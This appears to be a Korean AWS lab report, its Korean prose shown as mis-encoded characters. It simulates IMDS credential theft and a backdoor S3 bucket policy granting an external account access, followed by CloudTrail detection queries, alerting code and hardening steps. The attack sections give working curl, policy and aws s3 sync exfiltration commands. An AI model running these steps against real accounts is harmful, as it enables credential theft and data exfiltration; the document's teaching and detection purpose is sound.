<html>
<body>
<!--StartFragment--><html><head></head><body><h1>AWS ë‚´ë¶€ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ -<br> Backdoor an S3 Bucket via Bucket Policy ì‹¤ìŠµ ë³´ê³ ì„œ</h1>

</html># AWS ë‚´ë¶€ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ ì‹¤ìŠµ ë³´ê³ ì„œ

## ëª©ì°¨
1. [[ì‹¤ìŠµ ê°œìš”]](#ì‹¤ìŠµ-ê°œìš”)
2. [[ì¸í”„ë¼ êµ¬ì„±]](#ì¸í”„ë¼-êµ¬ì„±)
3. [[ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ 1: IAM Role ìê²© ì¦ëª… íƒˆì·¨]](#ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤-1-iam-role-ìê²©-ì¦ëª…-íƒˆì·¨)
4. [[ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ 2: S3 ë°±ë„ì–´ ì„¤ì •ì„ í†µí•œ ë°ì´í„° ìœ ì¶œ]](#ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤-2-s3-ë°±ë„ì–´-ì„¤ì •ì„-í†µí•œ-ë°ì´í„°-ìœ ì¶œ)
5. [[ë¡œê·¸ ë¶„ì„ ë° íƒì§€]](#ë¡œê·¸-ë¶„ì„-ë°-íƒì§€)
6. [[ëŒ€ì‘ ì „ëµ]](#ëŒ€ì‘-ì „ëµ)
7. [[ë³´ì•ˆ ê¶Œì¥ì‚¬í•­]](#ë³´ì•ˆ-ê¶Œì¥ì‚¬í•­)
8. [[ê²°ë¡ ]](#ê²°ë¡ )

---

## ì‹¤ìŠµ ê°œìš”

### ì‹¤ìŠµ ëª©ì 
AWS í™˜ê²½ì—ì„œ IAMê¶Œí•œì„ íšë“í•œ ë‚´ë¶€ ì‚¬ìš©ìê°€ s3:PutBucketPolicy ê¶Œí•œì„ ì•…ìš©í•˜ì—¬, ì™¸ë¶€ ê³µê²©ìì˜ AWS ê³„ì •ì— ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•¨ìœ¼ë¡œì¨ S3 ë²„í‚·ì—ì„œ ë°ì´í„°ë¥¼ ìœ ì¶œí•˜ëŠ” ì •ì±… ê¸°ë°˜ ë°±ë„ì–´ ê³µê²©ì„ ì‹œë®¬ë ˆì´ì…˜í•œë‹¤.

### ì‹¤ìŠµ ë²”ìœ„
- EC2 ì¸ìŠ¤í„´ìŠ¤ë¥¼ í†µí•œ ë‚´ë¶€ë§ ì¹¨íˆ¬
- Instance Metadata Service(IMDS)ë¥¼ í™œìš©í•œ IAM ìê²© ì¦ëª… íƒˆì·¨
- S3 ë²„í‚· ì •ì±… ì¡°ì‘ì„ í†µí•œ ë°±ë„ì–´ ì„¤ì •
- CloudTrail ë¡œê·¸ ë¶„ì„ì„ í†µí•œ ê³µê²© íƒì§€

### ì‚¬ì „ ì§€ì‹
- **IMDSë€?**
IMDS (Instance Metadata Service) ëŠ” AWS EC2 ì¸ìŠ¤í„´ìŠ¤ ë‚´ë¶€ì—ì„œ ìì‹ ì˜ ì •ë³´(IAM Role, IP, ì¸ìŠ¤í„´ìŠ¤ ID ë“±) ë¥¼
HTTPë¥¼ í†µí•´ í™•ì¸í•  ìˆ˜ ìˆë„ë¡ ì œê³µí•˜ëŠ” ë©”íƒ€ë°ì´í„° APIì…ë‹ˆë‹¤.
ê¸°ë³¸ ìš”ì²­ ì£¼ì†Œ: " http://169.254.169.254/latest/meta-data/ "ì£¼ë¡œ EC2 ë‚´ë¶€ì—ì„œ IAM Role ìê²© ì¦ëª…ì„ ìë™ìœ¼ë¡œ ê°€ì ¸ì˜¬ ë•Œ ì‚¬ìš©í•˜ë©°
AWS SDKë‚˜ CLIì—ì„œ ìë™ìœ¼ë¡œ ì´ ê²½ë¡œë¥¼ ì°¸ì¡°í•¨
- **ì‹¤ìŠµ ë°°ê²½**  
ì´ ì‹¤ìŠµì€ IMDSv1ì„ í—ˆìš©í•œ EC2 í™˜ê²½ì—ì„œ,  
ê³µê²©ìê°€ EC2 ë©”íƒ€ë°ì´í„° ì„œë¹„ìŠ¤ì— ì ‘ê·¼í•˜ì—¬ IAM Role ìê²© ì¦ëª…ì„ íƒˆì·¨í•˜ëŠ” ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ë‹¤ë£¸
---

## ì¸í”„ë¼ êµ¬ì„±

### ì „ì²´ ì•„í‚¤í…ì²˜
```
Internet Gateway
       |
   Public Subnet (10.0.1.0/24)
   â”œâ”€â”€ Kali Linux (ê³µê²©ì)
   â””â”€â”€ Bastion Host (ì¤‘ê³„ìš©)
       |
   NAT Gateway
       |
   Private Subnet (10.0.2.0/24)
   â””â”€â”€ Target EC2 (Ubuntu, í”¼í•´ì)
```

### êµ¬ì„± ìš”ì†Œ

| êµ¬ë¶„ | ë¦¬ì†ŒìŠ¤ | ì—­í•  | ìœ„ì¹˜ |
|------|--------|------|------|
| **ë„¤íŠ¸ì›Œí¬** | VPC | ê²©ë¦¬ëœ ë„¤íŠ¸ì›Œí¬ í™˜ê²½ | ap-northeast-2 |
|  | Public Subnet | ì™¸ë¶€ ì ‘ê·¼ ê°€ëŠ¥ ì˜ì—­ | 10.0.1.0/24 |
|  | Private Subnet | ë‚´ë¶€ ë³´í˜¸ ì˜ì—­ | 10.0.2.0/24 |
| **ì»´í“¨íŒ…** | Kali Linux | ê³µê²©ì ë¨¸ì‹  | Public Subnet |
|  | Bastion Host | SSH ì¤‘ê³„ ì„œë²„ | Public Subnet |
|  | Target EC2 | ê³µê²© ëŒ€ìƒ ì„œë²„ | Private Subnet |
| **ë³´ì•ˆ/ë¡œê¹…** | CloudTrail | API í˜¸ì¶œ ë¡œê·¸ ê¸°ë¡ | ì „ì—­ |
|  | GuardDuty | ì´ìƒ í–‰ìœ„ íƒì§€ | ì „ì—­ |
|  | S3 Bucket | CloudTrail ë¡œê·¸ ì €ì¥ì†Œ | ap-northeast-2 |

### ë°°í¬ ë°©ë²•
- **Terraform**ì„ í†µí•œ Infrastructure as Code êµ¬í˜„
- ëª¨ë“  ë¦¬ì†ŒìŠ¤ì˜ ë²„ì „ ê´€ë¦¬ ë° ìë™í™”ëœ ë°°í¬ ì§€ì›

---

## ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ 1: IAM Role ìê²© ì¦ëª… íƒˆì·¨

### ê³µê²© íë¦„ ê°œìš”
```
Kali Linux â†’ Bastion Host (SSH) â†’ Target EC2 (Pivoting) â†’ IMDS ì ‘ê·¼ â†’ ìê²©ì¦ëª… íƒˆì·¨ â†’ ì™¸ë¶€ ì•…ìš©
```

### ë‹¨ê³„ë³„ ê³µê²© ìˆ˜í–‰

#### ë‹¨ê³„ 1: Bastion Host ì´ˆê¸° ì ‘ì†
```bash
# Kali Linuxì—ì„œ Bastion Hostë¡œ SSH ì ‘ì†
ssh -i ~/.ssh/ec2-default-key.pem ubuntu@<BASTION_PUBLIC_IP>
```

**ê³µê²© í¬ì¸íŠ¸:**
- ê³µê²©ìëŠ” í¼ë¸”ë¦­ ì„œë¸Œë„·ì˜ Kali ì¸ìŠ¤í„´ìŠ¤ì—ì„œ ê³µê²© ì‹œì‘
- Bastion Hostê°€ ë‚´ë¶€ë§ ì ‘ê·¼ì„ ìœ„í•œ ìœ ì¼í•œ ì§„ì…ì 
- SSH í‚¤ ê¸°ë°˜ ì¸ì¦ì„ í†µí•œ ì ‘ê·¼

#### ë‹¨ê³„ 2: SSH Pivotingì„ í†µí•œ ë‚´ë¶€ë§ ì¹¨íˆ¬
```bash
# Bastion Hostì—ì„œ Private Subnetì˜ Target EC2ë¡œ ì ‘ì†
ssh -i ~/.ssh/ec2-default-key.pem ubuntu@<TARGET_PRIVATE_IP>

# SSH í‚¤ ê¶Œí•œ ì„¤ì • (í•„ìš”ì‹œ)
chmod 400 ~/.ssh/ec2-default-key.pem
```

**ê¸°ìˆ ì  ì„¸ë¶€ì‚¬í•­:**
- ë‚´ë¶€ë§ í†µì‹  (10.0.2.0/24)ì„ í†µí•œ íƒ€ê²Ÿ ì„œë²„ ì ‘ê·¼
- ë™ì¼í•œ SSH í‚¤ë¥¼ ì‚¬ìš©í•œ íš¡ì  ì´ë™(Lateral Movement)

#### ë‹¨ê³„ 3: Instance Metadata Service(IMDS) ì•…ìš©

**IMDS ê°œë…:**
Instance Metadata ServiceëŠ” EC2 ì¸ìŠ¤í„´ìŠ¤ ë‚´ë¶€ì—ì„œ ë©”íƒ€ë°ì´í„°ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” HTTP ê¸°ë°˜ ì„œë¹„ìŠ¤ì…ë‹ˆë‹¤.
- ê¸°ë³¸ ì—”ë“œí¬ì¸íŠ¸: `http://169.254.169.254/latest/meta-data/`
- AWS SDK ë° CLIì—ì„œ ìë™ìœ¼ë¡œ ì°¸ì¡°
- IAM Role ìê²© ì¦ëª…ì„ ì„ì‹œë¡œ ì œê³µ

**ìê²© ì¦ëª… íƒˆì·¨ ê³¼ì •:**
```bash
# IAM Role ì´ë¦„ í™•ì¸
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# ì‹¤ì œ ìê²© ì¦ëª… íšë“
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```

**ì‘ë‹µ ë°ì´í„° êµ¬ì¡°:**
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "IQoJb3JpZ2luX2Vj...",
  "Expiration": "2025-04-02T12:00:00Z"
}
```

#### ë‹¨ê³„ 4: ì™¸ë¶€ í™˜ê²½ì—ì„œ ìê²© ì¦ëª… ì„¤ì •
```bash
# Kali Linuxì—ì„œ AWS CLI í”„ë¡œí•„ êµ¬ì„±
vim ~/.aws/credentials
```

```ini
[stolen-creds]
aws_access_key_id = <AccessKeyId>
aws_secret_access_key = <SecretAccessKey>
aws_session_token = <Token>
region = ap-northeast-2
```

#### ë‹¨ê³„ 5: ê¶Œí•œ ë‚¨ìš© ë° ì •ë³´ ìˆ˜ì§‘
```bash
# S3 ë²„í‚· ëª©ë¡ ì¡°íšŒ
aws s3 ls --profile stolen-creds

# ê¸°íƒ€ ê°€ëŠ¥í•œ ì •ë³´ ìˆ˜ì§‘ ëª…ë ¹
aws sts get-caller-identity --profile stolen-creds
aws iam list-attached-role-policies --role-name target-ec2-role --profile stolen-creds
```

### Target EC2 IAM Role ê¶Œí•œ êµ¬ì„±
ì‹¤ìŠµ í™˜ê²½ì—ì„œ Target EC2ì— ë¶€ì—¬ëœ ìµœì†Œ ê¶Œí•œ:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:ListAllMyBuckets",
        "s3:ListBucket"
      ],
      "Resource": "*"
    }
  ]
}
```

---

## ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ 2: S3 ë°±ë„ì–´ ì„¤ì •ì„ í†µí•œ ë°ì´í„° ìœ ì¶œ

### ê³µê²© ê°œìš”
ê¶Œí•œì„ íšë“í•œ ë‚´ë¶€ ì‚¬ìš©ìê°€ `s3:PutBucketPolicy` ê¶Œí•œì„ ì•…ìš©í•˜ì—¬ ì™¸ë¶€ ê³µê²©ìì˜ AWS ê³„ì •ì— ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•˜ê³ , S3 ë²„í‚·ì—ì„œ ë°ì´í„°ë¥¼ ìœ ì¶œí•˜ëŠ” ì •ì±… ê¸°ë°˜ ë°±ë„ì–´ ê³µê²©ì„ ì‹œë®¬ë ˆì´ì…˜í•©ë‹ˆë‹¤.

### ê³µê²© í™˜ê²½ ì„¤ì •

| êµ¬ë¶„ | ì„¤ëª… |
|------|------|
| **ë‚´ë¶€ ê³µê²©ì** | EC2 ì¸ìŠ¤í„´ìŠ¤ì—ì„œ IAM Role ìê²© íƒˆì·¨, AWS CLI ì‚¬ìš© ê°€ëŠ¥ |
| **ì™¸ë¶€ ê³µê²©ì** | ë³„ë„ì˜ AWS ê³„ì • ë³´ìœ  (Account ID: 123456789012) |
| **ëŒ€ìƒ ë¦¬ì†ŒìŠ¤** | S3 ë²„í‚· `confidential-research-data` (ë¯¼ê° ì •ë³´ ì €ì¥) |

### ë‹¨ê³„ë³„ ê³µê²© ìˆ˜í–‰

#### ë‹¨ê³„ 1: ì‚¬ì „ íƒˆì·¨í•œ ìê²© ì¦ëª… í™œìš©
```bash
# ì´ì „ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ íšë“í•œ ìê²© ì¦ëª… ì‚¬ìš©
aws configure --profile backdoor-creds
```

#### ë‹¨ê³„ 2: ëŒ€ìƒ S3 ë²„í‚· ì •ë³´ ìˆ˜ì§‘
```bash
# ì ‘ê·¼ ê°€ëŠ¥í•œ S3 ë²„í‚· ëª©ë¡ í™•ì¸
aws s3 ls --profile backdoor-creds

# íŠ¹ì • ë²„í‚· ë‚´ ë¯¼ê° ë°ì´í„° í™•ì¸
aws s3 ls s3://confidential-research-data --profile backdoor-creds --recursive
```

**ë°œê²¬ ê°€ëŠ¥í•œ ë¯¼ê° íŒŒì¼:**
- `employee_records.csv` - ì§ì› ê°œì¸ì •ë³´
- `keys.json` - API í‚¤ ë° ë¹„ë°€ë²ˆí˜¸
- `financials/quarterly_report.xlsx` - ì¬ë¬´ ì •ë³´

#### ë‹¨ê³„ 3: ë°±ë„ì–´ ë²„í‚· ì •ì±… ì‘ì„±
`backdoor-policy.json` íŒŒì¼ ìƒì„±:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "BackdoorReadAccess",
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789012:root"
      },
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::confidential-research-data",
        "arn:aws:s3:::confidential-research-data/*"
      ]
    }
  ]
}
```

#### ë‹¨ê³„ 4: ë°±ë„ì–´ ì •ì±… ì ìš©
```bash
# S3 ë²„í‚·ì— ë°±ë„ì–´ ì •ì±… ì ìš©
aws s3api put-bucket-policy \
  --bucket confidential-research-data \
  --policy file://backdoor-policy.json \
  --profile backdoor-creds
```

ì„±ê³µ ì‹œ, ì™¸ë¶€ AWS ê³„ì •(123456789012)ì´ í•´ë‹¹ ë²„í‚·ì— ì™„ì „ ì ‘ê·¼ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤.

#### ë‹¨ê³„ 5: ì™¸ë¶€ ê³„ì •ì„ í†µí•œ ë°ì´í„° ìœ ì¶œ
```bash
# ì™¸ë¶€ ê³µê²©ì ê³„ì •ì—ì„œ ì‹¤í–‰
# ë‹¨ì¼ íŒŒì¼ ë‹¤ìš´ë¡œë“œ
aws s3 cp s3://confidential-research-data/employee_records.csv ./stolen/

# ì „ì²´ ë²„í‚· ë°ì´í„° ë™ê¸°í™”
aws s3 sync s3://confidential-research-data ./stolen-data/ --delete

# ì••ì¶• í›„ ì™¸ë¶€ë¡œ ì „ì†¡
tar -czf company_data.tar.gz ./stolen-data/
```

**ê³µê²© ê²°ê³¼:** ì¡°ì§ì˜ ëª¨ë“  ë¯¼ê° ë°ì´í„°ê°€ ì™¸ë¶€ ê³„ì •ìœ¼ë¡œ ì™„ì „ ìœ ì¶œë¨

---

## ë¡œê·¸ ë¶„ì„ ë° íƒì§€

### CloudTrail ë¡œê·¸ ë¶„ì„

#### ì£¼ìš” íƒì§€ ì´ë²¤íŠ¸

**ë¹„ì •ìƒì ì¸ API í˜¸ì¶œ íŒ¨í„´**
```json
{
  "eventTime": "2025-05-27T10:30:00Z",
  "eventName": "ListBuckets", 
  "userAgent": "aws-cli/2.13.0 Python/3.11.3 Linux/5.15.0-kali3-amd64",
  "sourceIPAddress": "3.34.123.45",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::111122223333:assumed-role/target-ec2-role/i-0123456789abcdef0"
  }
}
```

**íƒì§€ í¬ì¸íŠ¸:**
- EC2 Roleì´ì§€ë§Œ ì™¸ë¶€ IPì—ì„œ API í˜¸ì¶œ
- Kali Linux User-Agent í¬í•¨  
- í‰ìƒì‹œì™€ ë‹¤ë¥¸ ì‹œê°„ëŒ€ í™œë™

**S3 ë²„í‚· ì •ì±… ë³€ê²½ ì´ë²¤íŠ¸**
```json
{
  "eventTime": "2025-05-27T11:15:00Z",
  "eventName": "PutBucketPolicy",
  "requestParameters": {
    "bucketName": "confidential-research-data"
  },
  "userIdentity": {
    "type": "AssumedRole", 
    "arn": "arn:aws:sts::111122223333:assumed-role/target-ec2-role/i-0123456789abcdef0"
  }
}
```

#### Amazon Athena ë¶„ì„ ì¿¼ë¦¬

**ì™¸ë¶€ IPì—ì„œì˜ EC2 Role ì‚¬ìš© íƒì§€**
```sql
SELECT 
    eventtime,
    eventname, 
    sourceipaddress,
    useragent,
    useridentity.arn
FROM cloudtrail_logs 
WHERE useridentity.type = 'AssumedRole'
  AND useridentity.arn LIKE '%target-ec2-role%'
  AND sourceipaddress NOT LIKE '10.%'
  AND eventtime > current_date - interval '7' day
ORDER BY eventtime DESC;
```

**S3 ë²„í‚· ì •ì±… ë³€ê²½ ì¶”ì **
```sql
SELECT 
    eventtime,
    requestparameters.bucketname,
    sourceipaddress,
    useridentity.arn as suspicious_user
FROM cloudtrail_logs
WHERE eventname = 'PutBucketPolicy'
  AND eventtime > current_date - interval '1' day
ORDER BY eventtime DESC;
```

---

## ëŒ€ì‘ ì „ëµ

### ì‹¤ì‹œê°„ íƒì§€ ë° ìë™ ëŒ€ì‘ ì‹œìŠ¤í…œ

#### ì•„í‚¤í…ì²˜ ê°œìš”
```
CloudTrail â†’ EventBridge â†’ Lambda â†’ SNS â†’ Email Alert
     â†“              â†“
 S3 Logs      ìë™ ëŒ€ì‘ ì‹¤í–‰
```

### Terraformì„ í†µí•œ ìë™ ëŒ€ì‘ ì‹œìŠ¤í…œ êµ¬ì„±

#### SNS ì•Œë¦¼ ì‹œìŠ¤í…œ ì„¤ì •
```hcl
# SNS Topic ìƒì„±
resource "aws_sns_topic" "security_alert" {
  name = "security-alerts-topic"
}

# SNS ì´ë©”ì¼ êµ¬ë…ì ë“±ë¡
resource "aws_sns_topic_subscription" "email_alert" {
  topic_arn = aws_sns_topic.security_alert.arn
  protocol  = "email"
  endpoint  = "security-team@company.com"
}
```

#### Lambda ì‹¤í–‰ ê¶Œí•œ ì„¤ì •
```hcl
# IAM ì—­í•  (Lambda ì‹¤í–‰ìš©)
resource "aws_iam_role" "lambda_alert_role" {
  name = "lambda_s3_alert_role"
  
  assume_role_policy = jsonencode({
    Version = "2012-10-17",
    Statement = [{
      Effect = "Allow",
      Principal = { Service = "lambda.amazonaws.com" },
      Action = "sts:AssumeRole"
    }]
  })
}

# SNS Publish ê¶Œí•œ
resource "aws_iam_policy" "lambda_alert_sns_policy" {
  name = "lambda_s3_alert_sns_policy"
  
  policy = jsonencode({
    Version = "2012-10-17",
    Statement = [{
      Effect   = "Allow",
      Action   = ["sns:Publish"],
      Resource = aws_sns_topic.security_alert.arn
    }]
  })
}

# ì •ì±… ì—°ê²°
resource "aws_iam_role_policy_attachment" "lambda_alert_attach" {
  role       = aws_iam_role.lambda_alert_role.name
  policy_arn = aws_iam_policy.lambda_alert_sns_policy.arn
}
```

#### Lambda í•¨ìˆ˜ ë°°í¬
```hcl
# Lambda S3 ë°±ë„ì–´ íƒì§€ í•¨ìˆ˜
resource "aws_lambda_function" "s3_backdoor_alert_lambda" {
  function_name = "s3-backdoor-alert"
  handler       = "lambda_s3_alert.lambda_handler"
  runtime       = "python3.9"
  role          = aws_iam_role.lambda_alert_role.arn
  
  filename         = "${path.module}/lambda_s3_alert.zip"
  source_code_hash = filebase64sha256("${path.module}/lambda_s3_alert.zip")
  
  environment {
    variables = {
      SNS_TOPIC_ARN = aws_sns_topic.security_alert.arn
    }
  }
}
```

#### EventBridge ê·œì¹™ ì„¤ì •
```hcl
# PutBucketPolicy ì´ë²¤íŠ¸ íƒì§€ ê·œì¹™
resource "aws_cloudwatch_event_rule" "s3_backdoor_event_rule" {
  name = "detect-putbucketpolicy-s3-backdoor"
  
  event_pattern = jsonencode({
    "source": ["aws.s3"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {
      "eventName": ["PutBucketPolicy"]
    }
  })
}

# Lambda ì‹¤í–‰ ê¶Œí•œ
resource "aws_lambda_permission" "s3_backdoor_lambda_permission" {
  statement_id  = "AllowEventBridgeInvokeS3Backdoor"
  action        = "lambda:InvokeFunction"
  function_name = aws_lambda_function.s3_backdoor_alert_lambda.function_name
  principal     = "events.amazonaws.com"
  source_arn    = aws_cloudwatch_event_rule.s3_backdoor_event_rule.arn
}

# EventBridge â†’ Lambda ì—°ê²°
resource "aws_cloudwatch_event_target" "s3_backdoor_lambda_target" {
  rule = aws_cloudwatch_event_rule.s3_backdoor_event_rule.name
  arn  = aws_lambda_function.s3_backdoor_alert_lambda.arn
}
```

### Lambda í•¨ìˆ˜ ì˜ˆì‹œ ì½”ë“œ
```python
import json
import boto3
import os

def lambda_handler(event, context):
    sns = boto3.client('sns')
    
    # CloudTrail ì´ë²¤íŠ¸ ì •ë³´ ì¶”ì¶œ
    detail = event['detail']
    event_name = detail['eventName']
    source_ip = detail['sourceIPAddress']
    user_identity = detail['userIdentity']
    bucket_name = detail['requestParameters']['bucketName']
    
    # ì•Œë¦¼ ë©”ì‹œì§€ êµ¬ì„±
    message = f"""
    ë³´ì•ˆ ê²½ê³ : S3 ë°±ë„ì–´ íƒì§€ë¨
    
    ì´ë²¤íŠ¸: {event_name}
    ë²„í‚·: {bucket_name}
    ì†ŒìŠ¤ IP: {source_ip}
    ì‚¬ìš©ì: {user_identity.get('arn', 'Unknown')}
    ì‹œê°„: {detail['eventTime']}
    
    ì¦‰ì‹œ í™•ì¸ì´ í•„ìš”í•©ë‹ˆë‹¤.
    """
    
    # SNS ì•Œë¦¼ ì „ì†¡
    sns.publish(
        TopicArn=os.environ['SNS_TOPIC_ARN'],
        Subject='S3 ë°±ë„ì–´ íƒì§€ ì•Œë¦¼',
        Message=message
    )
    
    return {
        'statusCode': 200,
        'body': json.dumps('Alert sent successfully')
    }
```
---
## ì˜ˆë°©ì  ë³´ì•ˆ ì¡°ì¹˜

#### IAM ì •ì±… ê°•í™”

**ì¡°ê±´ë¶€ S3 ë²„í‚· ì •ì±… ë³€ê²½ ê¶Œí•œ**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:PutBucketPolicy",
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "aws:RequestedRegion": "ap-northeast-2",
          "aws:PrincipalTag/Department": "Security"
        },
        "IpAddress": {
          "aws:SourceIp": ["10.0.0.0/8", "192.168.0.0/16"]
        }
      }
    }
  ]
}
```

**ë¦¬ì†ŒìŠ¤ íƒœê·¸ ê¸°ë°˜ ì ‘ê·¼ ì œì–´**
```json
{
  "Version": "2012-10-17", 
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:PutBucketPolicy",
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "s3:ExistingBucketTag/PolicyUpdateAllowed": "true"
        }
      }
    }
  ]
}
```

#### EC2 ì¸ìŠ¤í„´ìŠ¤ ë³´ì•ˆ ê°•í™”

**IMDSv2 ê°•ì œ ì ìš© (Terraform)**
```hcl
resource "aws_instance" "target" {
  # ê¸°ë³¸ ì„¤ì •...
  
  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                = "required"  # IMDSv2 ê°•ì œ
    http_put_response_hop_limit = 1
    instance_metadata_tags     = "enabled"
  }
}
```

---

## ë³´ì•ˆ ê¶Œì¥ì‚¬í•­

### ìš´ì˜ í™˜ê²½ ë³´ì•ˆ ì²´í¬ë¦¬ìŠ¤íŠ¸

| ë¶„ì•¼ | ì‹¤ìŠµ í™˜ê²½ | ìš´ì˜ í™˜ê²½ ê¶Œì¥ | ìš°ì„ ìˆœìœ„ |
|------|-----------|---------------|----------|
| **ì¸ì¦** | SSH í‚¤ ê¸°ë°˜ | Certificate Authority + MFA | ğŸ”´ High |
| **IMDS** | IMDSv1 í—ˆìš© | IMDSv2 ê°•ì œ (`http_tokens=required`) | ğŸ”´ High |
| **ë„¤íŠ¸ì›Œí¬** | ë‹¨ìˆœ SSH ì ‘ê·¼ | Session Manager + VPN | ğŸŸ¡ Medium |
| **ê¶Œí•œ** | ë°ëª¨ìš© S3 ê¶Œí•œ | ìµœì†Œ ê¶Œí•œ ì›ì¹™ ì ìš© | ğŸ”´ High |
| **ëª¨ë‹ˆí„°ë§** | ê¸°ë³¸ CloudTrail | ì‹¤ì‹œê°„ ì•Œë¦¼ + ìë™ ëŒ€ì‘ | ğŸŸ¡ Medium |

### í•µì‹¬ ë³´ì•ˆ ê°•í™” ë°©ì•ˆ

#### ì¸ì¦ ë° ì ‘ê·¼ ì œì–´
```bash
# Session Managerë¥¼ í†µí•œ ì•ˆì „í•œ EC2 ì ‘ê·¼
aws ssm start-session --target i-1234567890abcdef0

# MFA ê°•ì œ ì •ì±… ì ìš©
aws iam put-user-policy --user-name admin --policy-name MFARequired --policy-document file://mfa-policy.json
```

#### ë„¤íŠ¸ì›Œí¬ ë³´ì•ˆ
```hcl
# VPC Flow Logs í™œì„±í™”
resource "aws_flow_log" "vpc_flow_log" {
  iam_role_arn    = aws_iam_role.flow_log.arn
  log_destination = aws_cloudwatch_log_group.vpc_log_group.arn
  traffic_type    = "ALL"
  vpc_id          = aws_vpc.main.id
}

# ì—„ê²©í•œ Security Group ì„¤ì •
resource "aws_security_group" "strict_sg" {
  name = "strict-access-sg"
  
  # SSHëŠ” íŠ¹ì • IPì—ì„œë§Œ í—ˆìš©
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/8"]  # ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ë§Œ
  }
  
  # ëª¨ë“  ì•„ì›ƒë°”ìš´ë“œ ì°¨ë‹¨ (í•„ìš”ì‹œì—ë§Œ í—ˆìš©)
  egress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```

#### ë°ì´í„° ë³´í˜¸
```hcl
# S3 ë²„í‚· ë³´ì•ˆ ê°•í™”
resource "aws_s3_bucket" "secure_bucket" {
  bucket = "company-secure-data"
}

# í¼ë¸”ë¦­ ì•¡ì„¸ìŠ¤ ì™„ì „ ì°¨ë‹¨
resource "aws_s3_bucket_public_access_block" "secure_bucket_pab" {
  bucket = aws_s3_bucket.secure_bucket.id
  
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# ê¸°ë³¸ ì•”í˜¸í™” ì„¤ì •
resource "aws_s3_bucket_server_side_encryption_configuration" "secure_bucket_encryption" {
  bucket = aws_s3_bucket.secure_bucket.id
  
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "AES256"
    }
  }
}
```

### ì§€ì†ì  ëª¨ë‹ˆí„°ë§ ì²´ê³„

#### í•„ìˆ˜ ëª¨ë‹ˆí„°ë§ ì´ë²¤íŠ¸
- `AssumeRole` - ì—­í•  ì‚¬ìš© íŒ¨í„´ ë¶„ì„
- `PutBucketPolicy` - S3 ì •ì±… ë³€ê²½ íƒì§€  
- `CreateUser` - ì‹ ê·œ ì‚¬ìš©ì ìƒì„± ì•Œë¦¼
- `AttachUserPolicy` - ê¶Œí•œ ë³€ê²½ ì¶”ì 
- `ConsoleLogin` - ì½˜ì†” ë¡œê·¸ì¸ ëª¨ë‹ˆí„°ë§

---

## ê²°ë¡ 

ë³¸ ì‹¤ìŠµì„ í†µí•´ AWS í™˜ê²½ì—ì„œ ë°œìƒí•  ìˆ˜ ìˆëŠ” ë‚´ë¶€ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ì™€ ì´ì— ëŒ€í•œ íƒì§€ ë° ëŒ€ì‘ ë°©ì•ˆì„ í™•ì¸í–ˆìŠµë‹ˆë‹¤. íŠ¹íˆ IMDSë¥¼ í†µí•œ ìê²© ì¦ëª… íƒˆì·¨ì™€ S3 ë²„í‚· ì •ì±… ì¡°ì‘ì´ë¼ëŠ” ë‘ ê°€ì§€ ì£¼ìš” ê³µê²© ë²¡í„°ì— ëŒ€í•´ ì‹¤ì œ ê³µê²© ê³¼ì •ì„ ì¬í˜„í•˜ê³ , CloudTrail ë¡œê·¸ ë¶„ì„ì„ í†µí•œ íƒì§€ ë°©ë²•ì„ ê²€ì¦í–ˆìŠµë‹ˆë‹¤.

ì‹¤ì œ ìš´ì˜ í™˜ê²½ì—ì„œëŠ” ë³¸ ë³´ê³ ì„œì—ì„œ ì œì‹œí•œ ë³´ì•ˆ ê¶Œì¥ì‚¬í•­ì„ ë°˜ë“œì‹œ ì ìš©í•˜ì—¬ ìœ ì‚¬í•œ ê³µê²©ì„ ì‚¬ì „ì— ë°©ì§€í•˜ê³ , ë§Œì•½ ê³µê²©ì´ ë°œìƒí•˜ë”ë¼ë„ ì‹ ì†í•œ íƒì§€ì™€ ëŒ€ì‘ì´ ê°€ëŠ¥í•˜ë„ë¡ ë³´ì•ˆ ì²´ê³„ë¥¼ êµ¬ì¶•í•´ì•¼ í•©ë‹ˆë‹¤.
